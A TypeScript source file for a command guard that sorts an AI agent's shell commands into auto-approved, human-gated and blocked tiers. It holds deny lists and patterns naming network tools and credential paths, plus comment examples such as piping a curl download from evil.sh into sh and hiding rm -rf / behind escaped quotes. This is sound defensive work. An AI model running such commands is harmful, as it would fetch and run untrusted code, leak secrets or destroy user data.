/**
 * Command classification & guard system — determines the trust tier for
 * tool-execution commands and enforces guardrails.
 *
 * ## Trust Tier Model
 *
 * | Tier | Label | Behavior |
 * |------|-------|----------|
 * | Tier 0 | Auto-Approved | Safe, routine commands. No prompt. |
 * | Tier 1 | Human Gate Required | Destructive, network, or high-risk commands. Prompts. |
 * | Tier 2 | Blocked | Unconditionally denied. Never executed. |
 *
 * ## Classification Order
 *
 * 1. Terminal-escape sanitization (REQ-8) — strip control chars first
 * 2. Tier 2 check — hard-deny and blocked patterns → Tier 2
 * 3. Compound command check (REQ-6) — unquoted shell metacharacters → Tier 1
 * 4. Exfiltration heuristics (REQ-7) — network verbs × sensitive paths → Tier 1
 * 5. Tier 1 deny-list — destructive commands → Tier 1
 * 6. Tier 0 allow-list — routine commands → Tier 0
 * 7. Default fallback → Tier 1 (conservative: unrecognized commands gate)
 *
 * @module command-guard
 */

// ── Trust Tier Enum ────────────────────────────────────────────────

/** The three graduated permission tiers. */
export enum TrustTier {
  /** Auto-approved — safe, routine commands. No prompt. */
  Tier0 = 0,
  /** Human gate required — destructive, network, or high-risk commands. */
  Tier1 = 1,
  /** Blocked — unconditionally denied. Never executed. */
  Tier2 = 2,
}

// ── Types ───────────────────────────────────────────────────────────

/** The complete classification verdict for a command. */
export interface ClassificationVerdict {
  /** The assigned trust tier. */
  tier: TrustTier;
  /** When tier is Tier 2, this explains why the command is blocked. */
  blocked: { reason: string; details: string } | null;
  /** Human-readable reasons explaining the classification. */
  reasons: string[];
}

/** Optional context for classification. */
export interface ClassificationContext {
  /** When true, the command is an internal `.zao/` artifact write → Tier 0. */
  isInternalMoWrite?: boolean;
}

// ── Terminal Escape Sanitization (REQ-8) ───────────────────────────

/**
 * Regex matching C0/C1 control characters and CSI/OSC escape sequences.
 *
 * - C0 controls: U+0000–U+001F (except tab U+0009, newline U+000A, carriage return U+000D)
 * - C1 controls: U+0080–U+009F
 * - CSI sequences: ESC [ (params/ints/semicolons) (terminating char in range 0x40–0x7E)
 * - OSC sequences: ESC ] (any chars) (BEL or ESC\ or ST)
 *
 * DEL (U+007F) is also stripped as a C1-like control character.
 */

// C0 controls that are kept: HT (0x09), LF (0x0A), CR (0x0D)
const C0_STRIP = /[\x00-\x08\x0B\x0C\x0E-\x1F]/g;

// C1 controls and DEL
const C1_STRIP = /[\x7F\x80-\x9F]/g;

// CSI: ESC [ ... (0x40-0x7E terminator)
const CSI_STRIP = /\x1B\[[0-?]*[ -/]*[@-~]/g;

// OSC: ESC ] ... (BEL or ST)
// ST = ESC \ or U+009C
const OSC_STRIP = /\x1B\].*?(?:\x07|\x1B\\|\x9C)/gs;

// ── Compound Command Detection (REQ-6) ────────────────────────────

/** Shell metacharacter sequences that indicate compound commands. */
const COMPOUND_META_PATTERNS: RegExp[] = [
  /&&/,     // AND operator
  /\|\|/,   // OR operator
  /`/,      // Command substitution (backtick)
  /\$\(/,   // Command substitution (POSIX)
];

/**
 * Tests whether `stripped` contains unquoted shell metacharacters.
 *
 * `;`, `|`, `>`, `<`, `&` are checked individually — but only when
 * they are standalone metacharacters (not inside single quotes).
 *
 * @param stripped - Command text with single-quoted segments removed.
 * @returns `true` if compound metacharacters are present.
 */
function hasUnquotedMeta(stripped: string): boolean {
  // Fixed-sequence metacharacters (always compound)
  for (const re of COMPOUND_META_PATTERNS) {
    if (re.test(stripped)) return true;
  }
  // Single-char metacharacters: ; | > < &
  // Only match when standalone (not part of &&, ||, etc.)
  // HIGH-003: \n and \r are compound metacharacters — newlines can
  // separate commands in shell scripts and one-liners (e.g.,
  // `echo safe\nrm -rf /` is two commands).
  if (/[\n\r;&|<>]/.test(stripped)) return true;
  return false;
}

/**
 * Removes single-quoted segments from a command string.
 *
 * Shell treats everything inside single quotes as literal text —
 * metacharacters inside single quotes are NOT interpreted.
 *
 * Handles escaped single quotes: `'text'\''more'` is `text'more`
 * after shell processing.
 *
 * ## Backslash handling (CRIT-001 fix)
 *
 * Outside of single quotes, a bare backslash emits itself plus the
 * next character without toggling any state. This prevents an attacker
 * from using `echo \'; rm -rf /; \'` to hide command separators
 * inside backslash-escaped quote constructs.
 *
 * @param command - Raw command string.
 * @returns The command with single-quoted segments removed.
 */
function stripSingleQuoted(command: string): string {
  let result = "";
  let inQuote = false;

  for (let i = 0; i < command.length; i++) {
    const ch = command[i]!;
    // CRIT-001: Backslash outside single quotes emits itself + next char
    if (ch === "\\" && !inQuote) {
      result += ch + (command[i + 1] ?? "");
      i++;
      continue;
    }
    if (ch === "'" && !inQuote) {
      inQuote = true;
      continue;
    }
    if (ch === "'" && inQuote) {
      inQuote = false;
      continue;
    }
    if (!inQuote) {
      result += ch;
    }
  }
  return result;
}

/**
 * Detects unquoted shell metacharacters that make a command compound.
 *
 * Compound commands always force Tier 1 because a benign-looking head
 * command (e.g., `npm test`) can be followed by a destructive payload
 * (e.g., `npm test && curl evil.sh | sh`).
 *
 * @param command - The raw command string.
 * @returns `true` if unquoted shell metacharacters are detected.
 */
function isCompoundCommand(command: string): boolean {
  const stripped = stripSingleQuoted(command);
  return hasUnquotedMeta(stripped);
}

// ── Exfiltration Heuristics (REQ-7) ────────────────────────────────

/** Network-egress verbs that can send data off-machine. */
const EGRESS_VERBS: RegExp[] = [
  /\bcurl\b/i,
  /\bwget\b/i,
  /\bnc\b/i,
  /\bncat\b/i,
  /\bnetcat\b/i,
  /\bscp\b/i,
  /\brsync\b/i,
  /\bftp\b/i,
  /\bsftp\b/i,
  /\btftp\b/i,
  /\bssh\b/i,
  /\bhttpie\b/i,
  /\bsocat\b/i,
  /\btelnet\b/i,
  /\bopenssl\s+s_client\b/i,
];

/** Sensitive paths that contain credentials or secrets. */
const SENSITIVE_PATHS: RegExp[] = [
  // SSH / cert material
  /~\/\.ssh/,
  /id_rsa/,
  /id_ecdsa/,
  /id_ed25519/,
  /\.pem\b/,
  // Cloud credentials
  /~\/\.aws/,
  /~\/\.config/,
  /~\/\.kube/,
  /~\/\.docker/,
  // System secrets
  /\/etc\/shadow/,
  /\/etc\/passwd/,
  // Config files with secrets
  /\.env\b/,
  /\.netrc\b/,
  /\.gitconfig\b/,
  /\.npmrc\b/,
  // Sensitive directories
  /\$HOME\//,
  /\/root\//,
  /\/\.secrets?\//,
  /\/credentials\b/,
];

/**
 * Checks whether the command combines network egress with sensitive paths.
 *
 * This is a heuristic for exfiltration risk: sending sensitive local
 * files to a remote host via `curl`, `scp`, etc.
 *
 * @param command - The raw command string.
 * @returns `true` if exfiltration risk is detected.
 */
function hasExfiltrationRisk(command: string): boolean {
  const hasEgress = EGRESS_VERBS.some((re) => re.test(command));
  if (!hasEgress) return false;

  const hasSensitive = SENSITIVE_PATHS.some((re) => re.test(command));
  return hasSensitive;
}

// ── Tier 2: Blocked Patterns ────────────────────────────────────────

/**
 * Patterns that unconditionally deny a command — never executed.
 *
 * These combine the old HARD_DENY_PATTERNS (root fs deletion, fork bomb,
 * privileged containers, etc.) with newly blocked system commands
 * (chown, chmod, shutdown, sudo, kill, mount, etc.).
 */
const TIER2_PATTERNS: { pattern: RegExp; reason: string; details: string }[] = [
  // ── Old hard-deny patterns ────────────────────────────────────
  {
    pattern: /\brm\s+-(?:rf|fr)\s+\/etc\b/,
    reason: "System configuration deletion",
    details: "This command would delete critical system configuration. It is unconditionally blocked.",
  },
  {
    pattern: /\brm\s+-(?:rf|fr)\s+~(\/[^\s]*)?(\s|$)/,
    reason: "Home directory deletion",
    details: "This command would recursively delete or target the home directory. It is unconditionally blocked.",
  },
  {
    // HIGH-007: Match bare "/" only (whitespace/EOL after /), not paths like /tmp or /var/log
    pattern: /\brm\s+-(?:rf|fr)\s+["']?\/["']?(?:\s|$)/,
    reason: "Root filesystem deletion",
    details: "This command would recursively delete the root filesystem. It is unconditionally blocked.",
  },
  {
    // MED-011: rm -rf $HOME — variable-expanded home deletion
    pattern: /\brm\s+-(?:rf|fr)\s+\$HOME\b/,
    reason: "Home directory deletion",
    details: "This command would recursively delete the user's home directory via $HOME. It is unconditionally blocked.",
  },
  {
    // HIGH-008: Docker privileged container with host root mount — detect flags independently
    pattern: /\bdocker\s+run\s+.*--privileged\b/,
    reason: "Privileged container detected",
    details: "Running a privileged container is unconditionally blocked.",
  },
  {
    // HIGH-008: Docker with host root mount (independent of --privileged)
    pattern: /\bdocker\s+run\s+.*-v\s+\/:/,
    reason: "Host root filesystem mount",
    details: "Mounting the host root filesystem into a container is unconditionally blocked.",
  },
  {
    pattern: /:\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\};\s*:/,
    reason: "Fork bomb detected",
    details: "This appears to be a fork bomb. It is unconditionally blocked.",
  },

  // ── New blocked system commands ─────────────────────────────────
  // Use (?:^|\s) prefix instead of \b to avoid matching substrings
  // in file paths (e.g., "passwd" in "/etc/passwd").
  // TRADEOFF: This may cause argument false positives (e.g., "echo chown"
  // would be blocked even though "chown" is just an argument, not the
  // command). This is fail-closed by design — blocking a false positive
  // is safer than allowing a dangerous command through.
  { pattern: /(?:^|\s)chown\b/, reason: "Ownership change", details: "Changing file ownership is unconditionally blocked." },
  { pattern: /(?:^|\s)chgrp\b/, reason: "Group change", details: "Changing file group is unconditionally blocked." },
  { pattern: /(?:^|\s)umask\b/, reason: "Umask modification", details: "Modifying the umask is unconditionally blocked." },
  { pattern: /(?:^|\s)chmod\b/, reason: "Permission change", details: "Changing file permissions is unconditionally blocked." },
  { pattern: /(?:^|\s)mount\b/, reason: "Mount operation", details: "Mount operations are unconditionally blocked." },
  { pattern: /(?:^|\s)umount\b/, reason: "Unmount operation", details: "Unmount operations are unconditionally blocked." },
  { pattern: /\bmkfs\./, reason: "Filesystem creation", details: "Creating filesystems is unconditionally blocked." },
  { pattern: /\bdd\s+if=/, reason: "Raw device write", details: "Raw device writes are unconditionally blocked." },
  { pattern: /(?:^|\s)fdisk\b/, reason: "Disk partitioning", details: "Disk partitioning is unconditionally blocked." },
  { pattern: /(?:^|\s)parted\b/, reason: "Disk partitioning", details: "Disk partitioning is unconditionally blocked." },
  { pattern: /(?:^|\s)shutdown\b/i, reason: "System shutdown", details: "System shutdown is unconditionally blocked." },
  { pattern: /(?:^|\s)reboot\b/i, reason: "System reboot", details: "System reboot is unconditionally blocked." },
  { pattern: /(?:^|\s)halt\b/i, reason: "System halt", details: "System halt is unconditionally blocked." },
  { pattern: /(?:^|\s)poweroff\b/i, reason: "System poweroff", details: "System poweroff is unconditionally blocked." },
  { pattern: /(?:^|\s)kill\b/, reason: "Process termination", details: "Killing processes is unconditionally blocked." },
  { pattern: /(?:^|\s)killall\b/, reason: "Process termination", details: "Killing processes by name is unconditionally blocked." },
  { pattern: /(?:^|\s)pkill\b/, reason: "Process termination", details: "Killing processes by pattern is unconditionally blocked." },
  { pattern: /(?:^|\s)sudo\b/, reason: "Privilege escalation", details: "sudo is unconditionally blocked." },
  { pattern: /(?:^|\s)su\b/, reason: "User switch", details: "Switching users is unconditionally blocked." },
  { pattern: /(?:^|\s)passwd\b/, reason: "Password change", details: "Password management is unconditionally blocked." },
  { pattern: /(?:^|\s)useradd\b/, reason: "User management", details: "User account management is unconditionally blocked." },
  { pattern: /(?:^|\s)usermod\b/, reason: "User management", details: "User account management is unconditionally blocked." },
  { pattern: /(?:^|\s)userdel\b/, reason: "User management", details: "User account management is unconditionally blocked." },
  { pattern: /(?:^|\s)groupadd\b/, reason: "Group management", details: "Group management is unconditionally blocked." },
  { pattern: /(?:^|\s)groupmod\b/, reason: "Group management", details: "Group management is unconditionally blocked." },
  { pattern: /(?:^|\s)groupdel\b/, reason: "Group management", details: "Group management is unconditionally blocked." },
  { pattern: /(?:^|\s)iptables\b/, reason: "Firewall modification", details: "Modifying firewall rules is unconditionally blocked." },
  { pattern: /(?:^|\s)ip6tables\b/, reason: "Firewall modification", details: "Modifying firewall rules is unconditionally blocked." },
  { pattern: /(?:^|\s)nft\b/, reason: "Firewall modification", details: "Modifying nftables is unconditionally blocked." },
  { pattern: /(?:^|\s)ufw\b/, reason: "Firewall modification", details: "Modifying ufw is unconditionally blocked." },
  { pattern: /(?:^|\s)systemctl\b/, reason: "Systemd control", details: "Systemd service control is unconditionally blocked." },
  { pattern: /(?:^|\s)service\b/, reason: "Service control", details: "Service control is unconditionally blocked." },
  { pattern: /(?:^|\s)crontab\b/, reason: "Cron modification", details: "Modifying cron jobs is unconditionally blocked." },
];

// ── Tier 1: Human Gate Required Patterns ────────────────────────────

/**
 * Patterns that always force Tier 1 classification.
 *
 * Each entry has a pattern and a human-readable reason shown to the user.
 * These are destructive or high-risk commands that should never run
 * without explicit human approval.
 */
const TIER1_PATTERNS: { pattern: RegExp; reason: string }[] = [
  { pattern: /\brm\b/, reason: "File deletion" },
  { pattern: /git\s+push\s+.*[-\u2010\u2011\u2012\u2013\u2014\u2015]f(?:\b|[_\w])/, reason: "Force push to remote" },
  { pattern: /\bnpm\s+uninstall\b/, reason: "Package removal" },
  { pattern: /\bpip\s+uninstall\b/, reason: "Package removal" },
  { pattern: /\bcargo\s+uninstall\b/, reason: "Package removal" },
  { pattern: /\bDROP\s+(TABLE|DATABASE|SCHEMA)\b/i, reason: "Database destruction" },
  { pattern: /\bDELETE\s+FROM\b/i, reason: "Bulk data deletion" },
  { pattern: /\bterraform\s+apply\b/, reason: "Infrastructure mutation" },
  { pattern: /\bterraform\s+destroy\b/, reason: "Infrastructure destruction" },
  { pattern: /\bkubectl\s+delete\b/, reason: "Kubernetes resource deletion" },
  { pattern: /\bdocker\s+rm\b/, reason: "Container removal" },
  { pattern: /\bdocker\s+rmi\b/, reason: "Image removal" },
  { pattern: /\bdocker\s+system\s+prune\b/, reason: "Docker system cleanup" },
  { pattern: /\bgh\s+repo\s+delete\b/, reason: "Repository deletion" },
  { pattern: /\bgit\s+branch\s+.*-[dD]\b/, reason: "Branch deletion" },
  { pattern: /\bgit\s+reset\s+--hard\b/, reason: "Destructive git reset" },
  { pattern: /\bgit\s+stash\s+drop\b/, reason: "Stash deletion" },
  { pattern: /\b:\(\)\s*\{/, reason: "Fork bomb pattern" },
  // HIGH-005: Exec wrappers — shells and interpreters that can execute arbitrary code
  { pattern: /\b(?:ba|z|fi|k)?sh\b/, reason: "Shell interpreter (arbitrary code execution)" },
  { pattern: /\beval\b/, reason: "Inline code evaluation" },
  { pattern: /\bperl\b/, reason: "Perl interpreter (arbitrary code execution)" },
  { pattern: /\bruby\b/, reason: "Ruby interpreter (arbitrary code execution)" },
  { pattern: /\bxargs\b/, reason: "xargs (argument-to-command piping)" },
  // HIGH-006: Inline eval flags — -e/-c on interpreters enables arbitrary code
  { pattern: /\bpython\d*\s+.*-c\b/, reason: "Python inline code execution (-c)" },
  { pattern: /\bnode\s+.*-e\b/, reason: "Node inline code execution (-e)" },
  { pattern: /\bruby\s+.*-e\b/, reason: "Ruby inline code execution (-e)" },
  { pattern: /\bperl\s+.*-e\b/, reason: "Perl inline code execution (-e)" },
  { pattern: /\bbash\s+.*-c\b/, reason: "Bash inline command execution (-c)" },
  { pattern: /\bsh\s+.*-c\b/, reason: "Shell inline command execution (-c)" },

  // ── New Tier 1: Network operations and git mutations ────────────
  { pattern: /\bgit\s+commit\b/, reason: "Git commit" },
  { pattern: /\bcurl\b/i, reason: "Network request (curl)" },
  { pattern: /\bwget\b/i, reason: "Network request (wget)" },
  { pattern: /\bnpm\s+publish\b/, reason: "Package publish" },
  { pattern: /\bdocker\s+push\b/, reason: "Docker image push" },
  { pattern: /\bgh\b/, reason: "GitHub CLI" },
  { pattern: /\brsync\b/, reason: "Remote file sync" },
  { pattern: /\bscp\b/, reason: "Secure copy" },
  { pattern: /\bftp\b/i, reason: "FTP transfer" },
  { pattern: /\bsftp\b/i, reason: "SFTP transfer" },
  { pattern: /\btelnet\b/i, reason: "Telnet connection" },
  { pattern: /\bssh\b/, reason: "SSH connection" },
];

// ── Tier 0: Auto-Approved Patterns ──────────────────────────────────

/**
 * Patterns for routine commands that map to Tier 0.
 *
 * These are safe enough to auto-approve without prompting.
 * Includes all old Tier 2 commands plus newly added safe commands.
 */
const TIER0_PATTERNS: { pattern: RegExp; commandClass: string }[] = [
  // ── Package managers ────────────────────────────────────────────
  { pattern: /\bnpm\s+(test|install|ci|run|build|lint|format|typecheck)\b/, commandClass: "npm" },
  { pattern: /\bpip\s+(install|test|freeze|list|show)\b/, commandClass: "pip" },
  { pattern: /\bpip3\s+(install|test|freeze|list|show)\b/, commandClass: "pip" },
  { pattern: /\bcargo\s+(test|build|check|run|fmt|clippy)\b/, commandClass: "cargo" },
  { pattern: /\bbun\s+(test|install|run|build|lint|format|update)\b/, commandClass: "bun" },
  { pattern: /\byarn\s+(test|install|build|lint)\b/, commandClass: "yarn" },
  { pattern: /\bpnpm\s+(test|install|build|lint)\b/, commandClass: "pnpm" },
  { pattern: /\bbunx\s+/, commandClass: "bunx" },
  { pattern: /\bnpx\s+/, commandClass: "npx" },

  // ── Build tools ─────────────────────────────────────────────────
  { pattern: /\bmake\b/, commandClass: "make" },
  { pattern: /\btsc\b/, commandClass: "tsc" },
  { pattern: /\btsx\b/, commandClass: "tsx" },

  // ── Git (safe operations) ───────────────────────────────────────
  { pattern: /\bgit\s+(status|log|diff|add|branch(?!\s.*-[dD])|show)\b/, commandClass: "git" },
  // Git mutations within worktree (Tier 0)
  { pattern: /\bgit\s+(checkout|stash\s+push|stash\s+save|stash\s+apply|stash\s+pop|stash\s+list)\b/, commandClass: "git" },
  { pattern: /\bgit\s+stash\b(?!\s+drop)(?:\s|$)/, commandClass: "git" },
  { pattern: /\bgit\s+(rebase|reset|clean|rm|mv|tag|merge|cherry-pick|revert|fetch|pull|remote)\b/, commandClass: "git" },

  // ── Docker (safe operations) ────────────────────────────────────
  { pattern: /\bdocker\s+(build|compose\s+(up|down|build|ps|logs))\b/i, commandClass: "docker" },

  // ── Go ──────────────────────────────────────────────────────────
  { pattern: /\bgo\s+(test|build|run|fmt|vet|mod\s+tidy)\b/, commandClass: "go" },

  // ── Language runtimes (safe, no eval flags) ─────────────────────
  { pattern: /\bnode\s+/, commandClass: "node" },
  { pattern: /\bpython\s+/, commandClass: "python" },
  { pattern: /\bpython3\s+/, commandClass: "python" },

  // ── File utilities ──────────────────────────────────────────────
  { pattern: /\btree\b/, commandClass: "tree" },
  { pattern: /\bfind\s+/, commandClass: "find" },
  { pattern: /\bgrep\s+/, commandClass: "grep" },
  { pattern: /\brg\s+/, commandClass: "rg" },
  { pattern: /\bcat\s+/, commandClass: "cat" },
  { pattern: /\bhead\s+/, commandClass: "head" },
  { pattern: /\btail\s+/, commandClass: "tail" },
  { pattern: /\bless\s+/, commandClass: "less" },
  { pattern: /\bls\b/, commandClass: "ls" },
  { pattern: /\bwc\b/, commandClass: "wc" },
  { pattern: /\bdu\b/, commandClass: "du" },
  { pattern: /\bdf\b/, commandClass: "df" },
  { pattern: /\bwhich\b/, commandClass: "which" },
  { pattern: /\becho\b/, commandClass: "echo" },
  { pattern: /\bprintf\b/, commandClass: "printf" },
  { pattern: /\bdate\b/, commandClass: "date" },
  { pattern: /\benv\b(?!\s+.*\bcurl\b|\s+.*\bwget\b)/, commandClass: "env" },
  { pattern: /\bprintenv\b/, commandClass: "printenv" },
  { pattern: /\btype\b/, commandClass: "type" },
  { pattern: /\bdiff\b/, commandClass: "diff" },
  { pattern: /\bmkdir\b/, commandClass: "mkdir" },
  { pattern: /\bcp\s+/, commandClass: "cp" },
  { pattern: /\bmv\s+/, commandClass: "mv" },
  { pattern: /\btouch\s+/, commandClass: "touch" },
  { pattern: /\bsort\b/, commandClass: "sort" },
  { pattern: /\buniq\b/, commandClass: "uniq" },
  { pattern: /\bln\s+/, commandClass: "ln" },
  { pattern: /\btee\s+/, commandClass: "tee" },
  { pattern: /\bcut\s+/, commandClass: "cut" },
  { pattern: /\btr\s+/, commandClass: "tr" },
  { pattern: /\bsed\s+/, commandClass: "sed" },
  { pattern: /\bawk\s+/, commandClass: "awk" },
  { pattern: /\bbasename\b/, commandClass: "basename" },
  { pattern: /\bdirname\b/, commandClass: "dirname" },
  { pattern: /\brealpath\b/, commandClass: "realpath" },
  { pattern: /\breadlink\b/, commandClass: "readlink" },
];

// ── Public Functions ────────────────────────────────────────────────

/**
 * Strips terminal escape sequences and control characters from a string.
 *
 * Covers:
 * - C0 controls (0x00–0x1F, except tab/newline/CR)
 * - C1 controls (0x80–0x9F)
 * - DEL (0x7F)
 * - CSI sequences (ESC [ ... terminator)
 * - OSC sequences (ESC ] ... BEL/ST)
 *
 * This prevents ANSI injection attacks where escape sequences could
 * rewrite the displayed command in the terminal (REQ-8, AC-8).
 *
 * @param input - Raw string that may contain terminal escapes.
 * @returns The sanitized string with all escapes and control chars removed.
 */
export function sanitizeTerminalString(input: string): string {
  return input
    .replace(CSI_STRIP, "")
    .replace(OSC_STRIP, "")
    .replace(C1_STRIP, "")
    .replace(C0_STRIP, "");
}

/**
 * Classifies a command into a {@link TrustTier} with its supporting reasons.
 *
 * ## Classification Order
 *
 * 1. **Tier 0 (internal write)** — If `context.isInternalMoWrite` is true.
 * 2. **Tier 2 (blocked)** — Hard-deny and blocked patterns are unconditionally denied.
 * 3. **Compound Command** — Unquoted shell metacharacters force Tier 1
 *    (even if the head command would normally be Tier 0).
 * 4. **Exfiltration** — Network-egress verb + sensitive path → Tier 1.
 * 5. **Tier 1 Deny-List** — Destructive commands force Tier 1.
 * 6. **Tier 0 Allow-List** — Routine commands classify as Tier 0.
 * 7. **Default** — Falls back to Tier 1 (conservative: unrecognized commands
 *    require human gate).
 *
 * ## Story 008 Requirement
 *
 * When a user modifies a command via the HITL [M]odify flow, Story 008
 * **MUST** re-run `classifyCommand` on the modified command with a fresh
 * verdict before executing it. A modified command may introduce new
 * shell metacharacters, exec wrappers, or exfiltration vectors that the
 * original classification did not see.
 *
 * @param command - The raw command string to classify.
 * @param actionType - The action type (e.g., "shell", "file_write").
 * @param explanation - The model's user-facing explanation (untrusted DATA).
 * @param context - Optional classification context.
 * @returns A {@link ClassificationVerdict} with tier, reasons, and optional blocked.
 */
export function classifyCommand(
  command: string,
  actionType: string,
  explanation: string,
  context: ClassificationContext = {},
): ClassificationVerdict {
  // ── REQ-8: Sanitize terminal escapes before classification ──────
  const safeCommand = sanitizeTerminalString(command);
  // actionType and explanation are accepted for forward compatibility
  // (e.g., future action-type-aware rules).
  void actionType;
  void explanation;

  // ── Tier 0: Internal .zao/ artifact writes ──────────────────────
  if (context.isInternalMoWrite) {
    return {
      tier: TrustTier.Tier0,
      blocked: null,
      reasons: ["Internal .zao/ artifact write — no user impact."],
    };
  }

  // ── Tier 2: Blocked check ──────────────────────────────────────
  for (const blocked of TIER2_PATTERNS) {
    if (blocked.pattern.test(safeCommand)) {
      return {
        tier: TrustTier.Tier2,
        blocked: { reason: blocked.reason, details: blocked.details },
        reasons: ["Unconditionally blocked: " + blocked.reason],
      };
    }
  }

  const reasons: string[] = [];

  // ── REQ-6: Compound commands ───────────────────────────────────
  if (isCompoundCommand(safeCommand)) {
    reasons.push("Compound command detected (shell metacharacters) — minimum Tier 1.");
    // Also check exfiltration risk on top of compound
    if (hasExfiltrationRisk(safeCommand)) {
      reasons.push("Exfiltration risk: network egress with sensitive path.");
    }
    return {
      tier: TrustTier.Tier1,
      blocked: null,
      reasons,
    };
  }

  // ── REQ-7: Exfiltration heuristics ─────────────────────────────
  if (hasExfiltrationRisk(safeCommand)) {
    return {
      tier: TrustTier.Tier1,
      blocked: null,
      reasons: ["Exfiltration risk: network egress combined with sensitive path."],
    };
  }

  // ── Tier 1 deny-list ───────────────────────────────────────────
  for (const entry of TIER1_PATTERNS) {
    if (entry.pattern.test(safeCommand)) {
      return {
        tier: TrustTier.Tier1,
        blocked: null,
        reasons: [`Matched Tier 1 deny-list: ${entry.reason}.`],
      };
    }
  }

  // ── Tier 0 allow-list ──────────────────────────────────────────
  for (const entry of TIER0_PATTERNS) {
    if (entry.pattern.test(safeCommand)) {
      return {
        tier: TrustTier.Tier0,
        blocked: null,
        reasons: [`Matched Tier 0 allow-list: ${entry.commandClass} routine command.`],
      };
    }
  }

  // ── Default fallback ────────────────────────────────────────────
  // Conservative: unrecognized commands default to Tier 1 so the user
  // is at least prompted.
  return {
    tier: TrustTier.Tier1,
    blocked: null,
    reasons: ["Unrecognized command — defaulting to Tier 1 (human gate)."],
  };
}

/**
 * Derives a stable command class label for Tier 0 session-level approval tracking.
 *
 * The command class groups similar commands so that approving `npm test`
 * also trusts `npm run build` within the same session.
 *
 * @param command - The raw command string.
 * @returns A stable label (e.g., `"npm"`, `"git"`, `"bun"`) or `"unknown"`.
 */
export function deriveCommandClass(command: string): string {
  const safeCommand = sanitizeTerminalString(command);

  for (const entry of TIER0_PATTERNS) {
    if (entry.pattern.test(safeCommand)) {
      return entry.commandClass;
    }
  }

  // For Tier 1 and unrecognized commands, extract the first word as the class
  const trimmed = safeCommand.trim();
  if (trimmed.length === 0) return "unknown";
  const firstWord = trimmed.split(/\s+/)[0];
  return firstWord ?? "unknown";
}
